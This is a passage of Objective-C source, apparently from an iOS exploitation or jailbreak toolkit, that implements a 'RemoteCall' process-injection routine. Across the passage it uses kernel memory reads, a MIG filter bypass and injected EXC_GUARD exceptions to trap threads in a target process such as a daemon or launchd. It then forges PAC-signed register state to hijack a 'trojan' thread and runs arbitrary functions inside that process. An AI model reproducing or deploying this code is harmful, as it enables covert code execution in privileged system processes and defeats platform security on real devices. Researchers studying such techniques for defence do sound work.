    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?
    
    uint64_t firstPortAddr = task_get_ipc_port_kobject(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = task_get_ipc_port_kobject(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr)
        RC_DEBUG("[%s:%d] exception port kobjects first=%#llx second=%#llx (receive ports may have no kobject)\n",
                 __FUNCTION__, __LINE__, firstPortAddr, secondPortAddr);
    
    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        printf("[%s:%d] dlsym(getpid) failed while preparing dummy thread\n",
               __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] creating local dummy thread for RemoteCall bootstrap\n",
             __FUNCTION__, __LINE__);
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        printf("[%s:%d] pthread_create_suspended_np(dummy) failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, dummyErr, dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (!dummyThreadMach) {
        printf("[%s:%d] pthread_mach_thread_np(dummy) returned null\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadMach=0x%x\n",
             __FUNCTION__, __LINE__, dummyThreadMach);
    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    if (!is_kaddr_valid(dummyThreadAddr)) {
        printf("[%s:%d] failed to resolve dummy thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, dummyThreadMach, dummyThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadAddr=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadAddr);
    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
    if (!is_kaddr_valid(dummyThreadTro)) {
        printf("[%s:%d] dummy thread tro invalid %#llx\n",
               __FUNCTION__, __LINE__, dummyThreadTro);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadTro=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadTro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = task_get_ipc_port_kobject(selfTask, threadSelf);
    if (!is_kaddr_valid(selfThreadAddr)) {
        printf("[%s:%d] failed to resolve self thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, threadSelf, selfThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        mach_port_deallocate(mach_task_self_, threadSelf);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
    RC_DEBUG("[%s:%d] selfThreadAddr=%#llx selfThreadCtid=%#x\n",
             __FUNCTION__, __LINE__, selfThreadAddr, selfThreadCtid);
    mach_port_deallocate(mach_task_self_, threadSelf);
    
    g_RC_creatingExtraThread = true;
    g_RC_firstExceptionPort = firstExceptionPort;
    g_RC_secondExceptionPort = secondExceptionPort;
    g_RC_firstExceptionPortAddr = firstPortAddr;
    g_RC_secondExceptionPortAddr = secondPortAddr;
    g_RC_dummyThread = dummyThread;
    g_RC_dummyThreadMach = dummyThreadMach;
    g_RC_dummyThreadAddr = dummyThreadAddr;
    g_RC_dummyThreadTro = dummyThreadTro;
    g_RC_selfThreadAddr = selfThreadAddr;
    g_RC_selfThreadCtid = selfThreadCtid;
    
    g_RC_threadList = [NSMutableArray new];
    
    int targetInjectedThreadCount = requestedBootstrapThreadCount > 0
        ? requestedBootstrapThreadCount : 2;
    /* Existing callers still request at most eight.  Daemons with a larger
     * dispatch pool may explicitly request up to sixteen so a provoked XPC
     * request cannot simply land on an unguarded resident worker. */
    if (targetInjectedThreadCount > 16) targetInjectedThreadCount = 16;
    RC_DEBUG("[%s:%d] Target injected threads: %d\n",
             __FUNCTION__, __LINE__, targetInjectedThreadCount);

    int validThreadCount = 0;
    int successThreadCount = 0;
    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
    if (!firstThread || !is_kaddr_valid(firstThread)) {
        printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
        destroy_remote_call();
        return -1;
    }

    // task->threads is ordered by insertion.  Snapshot the complete bounded
    // queue.  Primary candidates are spread across it newest-first; if any
    // primary candidate exits or cannot be armed, the remaining snapshot
    // entries are attempted as fallbacks until the requested number of guards
    // has actually been installed.
    NSMutableArray<NSNumber *> *threadSnapshot = [NSMutableArray array];
    uint64_t threadQueueHead = g_RC_taskAddr + off_task_threads_next;
    uint64_t scanThread = firstThread;
    const NSUInteger threadSnapshotLimit = 128;
    while (threadSnapshot.count < threadSnapshotLimit &&
           is_kaddr_valid(scanThread) && scanThread != threadQueueHead) {
        if (thread_get_task(scanThread) != g_RC_taskAddr) break;
        [threadSnapshot addObject:@(scanThread)];
        uint64_t next = kread64(scanThread + off_thread_task_threads_next);
        if (!next || next == UINT64_MAX || next == scanThread ||
            next == firstThread || next == threadQueueHead) break;
        scanThread = next;
    }
    if (threadSnapshot.count == 0) {
        printf("[%s:%d] no valid target threads remained in snapshot for %s\n",
               __FUNCTION__, __LINE__, process);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads,
                                      targetPid);
        destroy_remote_call();
        return -1;
    }

    NSUInteger desiredGuardCount = MIN(
        (NSUInteger)targetInjectedThreadCount, threadSnapshot.count);
    NSMutableArray<NSNumber *> *candidateIndices =
        [NSMutableArray arrayWithCapacity:threadSnapshot.count];
    NSMutableIndexSet *includedIndices = [NSMutableIndexSet indexSet];

    if (g_RC_identityBootstrapRequested && desiredGuardCount == 1) {
        /* Stock foreground apps can leave their newest dispatch workers
         * blocked indefinitely.  Identity mode intentionally arms only one
         * thread, so choose the oldest task thread (the app main thread) and
         * let a normal scene activation drive it across the AST boundary. */
        [candidateIndices addObject:@0];
        [includedIndices addIndex:0];
    } else {
        /* Reverse the spread ranks so newly inserted dispatch workers are
         * armed before they have time to retire. */
        for (NSUInteger rank = 0; rank < desiredGuardCount; rank++) {
            NSUInteger spreadRank = desiredGuardCount - 1 - rank;
            NSUInteger index = desiredGuardCount == 1
                ? threadSnapshot.count - 1
                : (spreadRank * (threadSnapshot.count - 1)) /
                    (desiredGuardCount - 1);
            if (![includedIndices containsIndex:index]) {
                [candidateIndices addObject:@(index)];
                [includedIndices addIndex:index];
            }
        }
    }
    /* Integer spread rounding can duplicate indices, and any primary may die
     * during setup.  Every other snapshot entry remains available as a
     * newest-first fallback. */
    for (NSUInteger reverse = threadSnapshot.count; reverse > 0; reverse--) {
        NSUInteger index = reverse - 1;
        if (![includedIndices containsIndex:index]) {
            [candidateIndices addObject:@(index)];
            [includedIndices addIndex:index];
        }
    }
    NSUInteger primaryCandidateCount = MIN(
        desiredGuardCount, candidateIndices.count);
    printf("[RemoteCall] %s thread snapshot total=%lu desired-guards=%lu "
           "candidate-order=%lu strategy=%s\n",
           process, (unsigned long)threadSnapshot.count,
           (unsigned long)desiredGuardCount,
           (unsigned long)candidateIndices.count,
           g_RC_identityBootstrapRequested
               ? "identity-oldest-main-first-with-fallback"
               : "newest-first-spread-with-fallback");
    
    g_RC_trojanThreadAddr = 0;
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    NSUInteger candidateAttempt = 0;
    for (NSNumber *candidateIndex in candidateIndices) {
        if ((NSUInteger)successThreadCount >= desiredGuardCount) break;
        NSUInteger index = candidateIndex.unsignedIntegerValue;
        NSNumber *candidate = threadSnapshot[index];
        uint64_t currThread = candidate.unsignedLongLongValue;
        candidateAttempt++;
        printf("[RemoteCall] bootstrap candidate attempt=%lu/%lu "
               "snapshot-index=%lu/%lu priority=%s thread=%#llx\n",
               (unsigned long)candidateAttempt,
               (unsigned long)candidateIndices.count,
               (unsigned long)index,
               (unsigned long)threadSnapshot.count,
               candidateAttempt <= primaryCandidateCount
                   ? "primary" : "fallback",
               currThread);
        uint64_t task = thread_get_task(currThread);
        if (task != g_RC_taskAddr) {
            printf("[%s:%d] snapshot target thread became invalid: %#llx task=%#llx\n",
                   __FUNCTION__, __LINE__, currThread, task);
            continue;
        }
        validThreadCount++;
        exception_behavior_t bootstrapBehavior =
            g_RC_identityBootstrapRequested
                ? (EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES)
                : (EXCEPTION_STATE | MACH_EXCEPTION_CODES);
        if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread,
                                          useMigFilterBypass,
                                          bootstrapBehavior)) {
            printf("[%s:%d] Set exception port on thread:%#llx failed\n",
                   __FUNCTION__, __LINE__, currThread);
            continue;
        }
        if (!inject_guard_exception(currThread, guardCode)) {
            printf("[%s:%d] Inject EXC_GUARD on thread:%#llx failed\n",
                   __FUNCTION__, __LINE__, currThread);
            continue;
        }
        if (!g_RC_trojanThreadAddr) g_RC_trojanThreadAddr = currThread;
        successThreadCount++;
        [g_RC_threadList addObject:@(currThread)];
        RC_DEBUG("[%s:%d] Inject EXC_GUARD on thread:%#llx OK\n",
                 __FUNCTION__, __LINE__, currThread);
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    RC_DEBUG("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
    RC_DEBUG("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
    printf("[RemoteCall] %s bootstrap armed=%d desired=%lu attempts=%lu\n",
           process, successThreadCount, (unsigned long)desiredGuardCount,
           (unsigned long)candidateAttempt);
    
    if (g_RC_threadList.count == 0) {
        printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
        abandon_remote_call();
        return -1;
    }
    printf("[RemoteCall] EXC_GUARD injected on %lu thread(s) — waiting for trap.\n", (unsigned long)g_RC_threadList.count);

    // A daemon-specific caller may now provoke work after every selected
    // target thread has its exception port and AST_GUARD installed. Starting
    // the request earlier leaves a race where the daemon consumes it before
    // any thread is armed.
    if (bootstrapProvoker) {
        printf("[RemoteCall] Target threads armed — issuing bootstrap provoker.\n");
        @try {
            bootstrapProvoker();
        } @catch (NSException *exception) {
            printf("[RemoteCall] Bootstrap provoker raised: %s\n",
                   exception.description.UTF8String ?: "unknown exception");
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
            }
            remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
            abandon_remote_call();
            return -1;
        }
    }

    ExceptionMessage exc = {0};
    CNDRemoteCallIdentityRequest identityRequest = {0};
    BOOL usingIdentityBootstrap = g_RC_identityBootstrapRequested;
    int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
    RC_DEBUG("[%s:%d] First exception wait timeout=%dms\n",
             __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
    BOOL firstExceptionReceived = NO;
    if (usingIdentityBootstrap) {
        kern_return_t receiveKR = remote_call_receive_identity(
            firstExceptionPort, &identityRequest, firstExceptionTimeoutMS);
        firstExceptionReceived = receiveKR == KERN_SUCCESS;
        g_RC_identityMessageValid = firstExceptionReceived &&
            remote_call_identity_request_is_valid(&identityRequest);
        if (g_RC_identityMessageValid) {
            memcpy(&exc.threadState, identityRequest.old_state,
                   sizeof(exc.threadState));
            exc.exception = (uint32_t)identityRequest.exception;
            exc.codeCnt = identityRequest.codeCnt;
            if (identityRequest.codeCnt > 0) {
                exc.codeFirst = (uint64_t)identityRequest.code[0];
            }
            if (identityRequest.codeCnt > 1) {
                exc.codeSecond = (uint64_t)identityRequest.code[1];
            }
        } else {
            printf("[RemoteCall] identity bootstrap receive/validation failed "
                   "kr=0x%x id=%d size=%u descriptors=%u flavor=%d count=%u\n",
                   receiveKR, identityRequest.Head.msgh_id,
                   identityRequest.Head.msgh_size,
                   identityRequest.msgh_body.msgh_descriptor_count,
                   identityRequest.flavor, identityRequest.old_stateCnt);
        }
    } else {
        firstExceptionReceived = wait_exception(
            firstExceptionPort, &exc, firstExceptionTimeoutMS, false);
    }
    if (!firstExceptionReceived ||
        (usingIdentityBootstrap && !g_RC_identityMessageValid)) {
        printf("[%s:%d] Failed to receive first exception within %dms\n",
               __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
        for (NSNumber *thread in g_RC_threadList) {
            uint64_t threadAddr = thread.unsignedLongLongValue;
            uint64_t liveTask = thread_get_task(threadAddr);
            uint32_t ast = kread32(threadAddr + off_thread_ast);
            printf("[RemoteCall] timeout armed-thread=%#llx live=%s ast=%#x guard=%s\n",
                   threadAddr,
                   liveTask == g_RC_taskAddr ? "yes" : "no",
                   ast, (ast & 0x1000) ? "set" : "clear");
            clear_guard_exception(threadAddr);
        }
        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
        remote_call_release_identity_request_rights(&identityRequest, false);
        abandon_remote_call();
        return -1;
    }

    if (usingIdentityBootstrap) {
        uint64_t deliveredThread = task_get_ipc_port_kobject(
            selfTask, identityRequest.thread.name);
        uint64_t deliveredTask = task_get_ipc_port_kobject(
            selfTask, identityRequest.task.name);
        BOOL armedThreadExact = NO;
        for (NSNumber *thread in g_RC_threadList) {
            if (thread.unsignedLongLongValue == deliveredThread) {
                armedThreadExact = YES;
                break;
            }
        }
        g_RC_identityThreadRightExact =
            is_kaddr_valid(deliveredThread) && armedThreadExact &&
            thread_get_task(deliveredThread) == g_RC_taskAddr;
        g_RC_identityTaskRightExact =
            is_kaddr_valid(deliveredTask) && deliveredTask == g_RC_taskAddr;
        if (!g_RC_identityThreadRightExact ||
            !g_RC_identityTaskRightExact) {
            printf("[RemoteCall] identity bootstrap right mismatch "
                   "thread=%#llx armed=%s task=%#llx expected-task=%#llx\n",
                   deliveredThread, armedThreadExact ? "yes" : "no",
                   deliveredTask, g_RC_taskAddr);
            (void)remote_call_reply_identity(
                &identityRequest, &exc.threadState);
            remote_call_release_identity_request_rights(
                &identityRequest, false);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
            }
            remote_call_note_init_failure(
                RemoteCallInitFailureOther, targetPid);
            abandon_remote_call();
            return -1;
        }

        g_RC_trojanThreadAddr = deliveredThread;
        g_RC_identityThreadAddr = deliveredThread;
        g_RC_identityThreadPort = identityRequest.thread.name;
        identityRequest.thread.name = MACH_PORT_NULL;
        /* Retain the kernel-minted task-control send right only for this
         * RemoteCall session.  Bounded port-descriptor handoffs use it to
         * create a temporary target mailbox; teardown releases it alongside
         * the retained thread right on every normal and abandon path. */
        g_RC_identityTaskPort = identityRequest.task.name;
        identityRequest.task.name = MACH_PORT_NULL;
        remote_call_release_identity_request_rights(&identityRequest, true);
        g_RC_identityTrapAddress =
            remote_call_resolve_identity_trap_address();
        if (!g_RC_identityTrapAddress) {
            printf("[RemoteCall] identity bootstrap has no validated "
                   "executable trap address\n");
            (void)remote_call_reply_identity(
                &identityRequest, &exc.threadState);
            remote_call_release_identity_rights();
            remote_call_note_init_failure(
                RemoteCallInitFailureOther, targetPid);
            abandon_remote_call();
            return -1;
        }
        g_RC_identityHandlerRetained = true;
        printf("[RemoteCall] identity bootstrap bound exact target "
               "thread=%#llx port=0x%x task=%#llx task-port=0x%x trap=%#llx; future exceptions use "
               "validated identity delivery.\n",
               g_RC_identityThreadAddr, g_RC_identityThreadPort,
               g_RC_taskAddr, g_RC_identityTaskPort,
               g_RC_identityTrapAddress);
    }
    
    printf("[RemoteCall] Thread trapped — hijacking execution inside %s.\n", process);
    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    memcpy(&g_RC_capturedOriginalStates[0], &exc.threadState,
           sizeof(arm_thread_state64_internal));
    g_RC_capturedOriginalStateCount = 1;

    if (!usingIdentityBootstrap) {
        // State-only delivery carries no thread port. Infer the delivered
        // thread from the one consumed AST_GUARD as before.
        uint64_t deliveredThread = 0;
        NSUInteger deliveredCandidates = 0;
        for (NSNumber *thread in g_RC_threadList) {
            uint64_t threadAddr = thread.unsignedLongLongValue;
            uint32_t ast = kread32(threadAddr + off_thread_ast);
            BOOL live = thread_get_task(threadAddr) == g_RC_taskAddr;
            printf("[RemoteCall] trapped-thread candidate=%#llx live=%s ast=%#x guard=%s\n",
                   threadAddr, live ? "yes" : "no", ast,
                   (ast & 0x1000U) ? "set" : "clear");
            if (live && !(ast & 0x1000U)) {
                deliveredThread = threadAddr;
                deliveredCandidates++;
            }
        }
        if (deliveredCandidates == 1) {
            g_RC_trojanThreadAddr = deliveredThread;
            printf("[RemoteCall] identified delivered thread=%#llx from consumed guard\n",
                   deliveredThread);
        } else {
            printf("[RemoteCall] delivered-thread inference ambiguous candidates=%lu; using first armed thread=%#llx\n",
                   (unsigned long)deliveredCandidates,
                   g_RC_trojanThreadAddr);
        }
    }

    for (NSNumber *thread in g_RC_threadList) {
        clear_guard_exception(thread.unsignedLongLongValue);
    }
    RC_DEBUG("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
    
    if (!usingIdentityBootstrap) {
        ExceptionMessage exc2;
        int desiredTimeout = 1500;
        while (wait_exception(firstExceptionPort, &exc2, desiredTimeout,
                              false)) {
            if (g_RC_capturedOriginalStateCount <
                sizeof(remote_call_current_state()->capturedOriginalStates) /
                    sizeof(remote_call_current_state()->capturedOriginalStates[0])) {
                memcpy(&g_RC_capturedOriginalStates[g_RC_capturedOriginalStateCount],
                       &exc2.threadState,
                       sizeof(arm_thread_state64_internal));
                g_RC_capturedOriginalStateCount++;
            }
            reply_with_state(&exc2, &exc2.threadState);
        }
    }
    
    if (!g_RC_trojanThreadAddr)
        g_RC_trojanThreadAddr = firstThread;

    arm_thread_state64_internal newState = exc.threadState;
    uint64_t initialTrapPC = usingIdentityBootstrap
        ? g_RC_identityTrapAddress : FAKE_PC_TROJAN_CREATOR;
    uint64_t initialTrapLR = usingIdentityBootstrap
        ? g_RC_identityTrapAddress : FAKE_LR_TROJAN_CREATOR;
    BOOL initialConversionSucceeded = sign_state(
        g_RC_trojanThreadAddr, &newState,
        initialTrapPC, initialTrapLR);
    g_RC_identityInitialConversionSucceeded =
        usingIdentityBootstrap && initialConversionSucceeded;
    BOOL initialReplySucceeded = initialConversionSucceeded &&
        (usingIdentityBootstrap
            ? remote_call_reply_identity(&identityRequest, &newState) ==
                KERN_SUCCESS
            : reply_with_state(&exc, &newState));
    g_RC_identityInitialReplySucceeded =
        usingIdentityBootstrap && initialReplySucceeded;
    if (!initialReplySucceeded) {
        printf("[RemoteCall] initial target conversion/reply failed "
               "identity=%s converted=%s\n",
               usingIdentityBootstrap ? "yes" : "no",
               initialConversionSucceeded ? "yes" : "no");
        if (usingIdentityBootstrap && !initialConversionSucceeded) {
            (void)remote_call_reply_identity(
                &identityRequest, &exc.threadState);
        }
        remote_call_release_identity_request_rights(
            &identityRequest, false);
        remote_call_release_identity_rights();
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }

    if (g_RC_originalThreadOnly) {
        g_RC_creatingExtraThread = false;
        g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
        g_RC_pid = (int)targetPid;
        g_RC_success = true;
        RC_DEBUG("[%s:%d] Original-thread-only RemoteCall ready; skipping synthetic pthread\n",
             __FUNCTION__, __LINE__);
        return 0;
    }
    
    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
    RC_DEBUG("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
    g_RC_success = true;
    
    // Every target, including launchd, uses a normally running pthread whose
    // start routine sleeps while we install its exception action and guard.
    // The old unprompted path created a suspended pthread at a fake PC and
    // could only dispose of it by injecting pthread_exit. A normal start
    // routine gives teardown a genuine state to restore instead.
    uint64_t bootstrapStart = native_strip(
        (uint64_t)dlsym(RTLD_DEFAULT, "usleep"));
    /* The worker only needs to remain inside one interruptible syscall long
     * enough for the exception action and AST_GUARD to be installed.  One
     * second retains that bounded setup window without imposing the previous
     * eight-second cost on every fresh RemoteCall session. */
    uint64_t bootstrapArgument = 1000000;
    const char *bootstrapCreateFunction = "pthread_create";
    if (!bootstrapStart) {
        printf("[%s:%d] dlsym(usleep) failed for running bootstrap thread\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    uint64_t remoteCrashSigned = remote_pac(
        g_RC_trojanThreadAddr, bootstrapStart, 0);
    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
    if (!g_RC_success || bootstrapPid == 0) {
        printf("[%s:%d] bootstrap getpid failed before synthetic thread creation\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }

    uint64_t createResult = do_remote_call_temp(
        100, bootstrapCreateFunction, trojanMemTemp, 0,
        remoteCrashSigned, bootstrapArgument, 0, 0, 0, 0);
    if (!g_RC_success || createResult != 0) {
        printf("[%s:%d] %s remote call failed result=%llu\n",
               __FUNCTION__, __LINE__, bootstrapCreateFunction, createResult);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    
    RC_DEBUG("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
    RC_DEBUG("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
    if (!pthreadAddr) {
        printf("[%s:%d] %s did not write a pthread pointer\n",
               __FUNCTION__, __LINE__, bootstrapCreateFunction);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
    RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
    if (!g_RC_success || !callThreadPort) {
        printf("[%s:%d] pthread_mach_thread_np remote call failed\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
    if (!is_kaddr_valid(g_RC_callThreadAddr)) {
        printf("[%s:%d] failed to resolve synthetic thread kobject port=0x%llx addr=%#llx\n",
               __FUNCTION__, __LINE__, callThreadPort, g_RC_callThreadAddr);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    g_RC_callThreadNaturalReturn = true;
    
    if(useMigFilterBypass)
        mig_bypass_resume();
    
    if (!set_exception_port_on_thread(secondExceptionPort,
                                      g_RC_callThreadAddr,
                                      useMigFilterBypass,
                                      EXCEPTION_STATE |
                                          MACH_EXCEPTION_CODES)) {
        printf("[%s:%d] Failed to install exception port on running bootstrap thread\n",
               __FUNCTION__, __LINE__);
        if (useMigFilterBypass) mig_bypass_pause();
        (void)restore_trojan_thread(&g_RC_originalState);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
    
    if (!inject_guard_exception(g_RC_callThreadAddr, guardCode)) {
        printf("[%s:%d] Couldn't arm running bootstrap thread guard\n",
               __FUNCTION__, __LINE__);
        (void)restore_trojan_thread(&g_RC_originalState);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    printf("[RemoteCall] Running bootstrap thread armed inside %s; waiting for syscall return.\n",
           process);
    
    if (g_RC_creatingExtraThread) {
        RC_DEBUG("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
        restore_trojan_thread(&g_RC_originalState);
    }
    RC_DEBUG("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);

    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    if (!g_RC_success || g_RC_pid != (int)targetPid) {
        printf("[%s:%d] bootstrap worker validation failed expected pid=%u got=%d success=%s\n",
               __FUNCTION__, __LINE__, targetPid, g_RC_pid,
               g_RC_success ? "yes" : "no");
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    printf("[RemoteCall] Synthetic call thread live inside %s (pid=%d).\n", process, g_RC_pid);
    
    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
    
    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
    
    g_RC_success = true;
    RC_DEBUG("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);

    return 0;
}

int init_remote_call(const char* process, bool useMigFilterBypass)
{
    g_RC_identityBootstrapRequested = false;
    return init_remote_call_configured(process, useMigFilterBypass, 2, nil);
}

int init_remote_call_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    int previousTimeout = state->firstExceptionTimeoutMS;
    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : previousTimeout;
    int result = init_remote_call(process, useMigFilterBypass);
    state->firstExceptionTimeoutMS = previousTimeout;
    return result;
}

int init_remote_call_original_thread_only_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    bool previousOriginalThreadOnly = state->originalThreadOnly;
    state->originalThreadOnly = true;
    int result = init_remote_call_with_first_exception_timeout(process, useMigFilterBypass, firstExceptionTimeoutMS);
    state->originalThreadOnly = previousOriginalThreadOnly;
    return result;
}

int init_remote_call_identity_bootstrap_original_thread_only(
    const char *process, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    bool previousOriginalThreadOnly = state->originalThreadOnly;
    int previousTimeout = state->firstExceptionTimeoutMS;
    state->originalThreadOnly = true;
    state->identityBootstrapRequested = true;
    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0
        ? firstExceptionTimeoutMS : 15000;

    /* One armed thread makes the identity message's kernel-minted right
     * unambiguous and prevents a second identity-form message from being
     * queued while the delivered thread is downgraded to state-only. */
    int result = init_remote_call_configured(process, false, 1, nil);

    state->originalThreadOnly = previousOriginalThreadOnly;
    state->firstExceptionTimeoutMS = previousTimeout;
    return result;
}

@implementation RemoteCallSession {
    RemoteCallState _state;
}

- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:120000];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:firstExceptionTimeoutMS
              originalThreadOnly:NO];
}

- (instancetype)initWithIdentityBootstrapProcess:(NSString *)process
                          firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
{
    self = [super init];
    if (!self) return nil;

    memset(&_state, 0, sizeof(_state));
    _state.labClient.socketFD = -1;
    _state.success = true;
    _state.threadList = [NSMutableArray new];
    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0
        ? firstExceptionTimeoutMS : 15000;
    _state.stableExceptionTimeoutFloorMS = 10000;
    _state.originalThreadOnly = true;
    _state.identityBootstrapRequested = true;

    const char *processName = process.UTF8String;
    if (!processName) return nil;

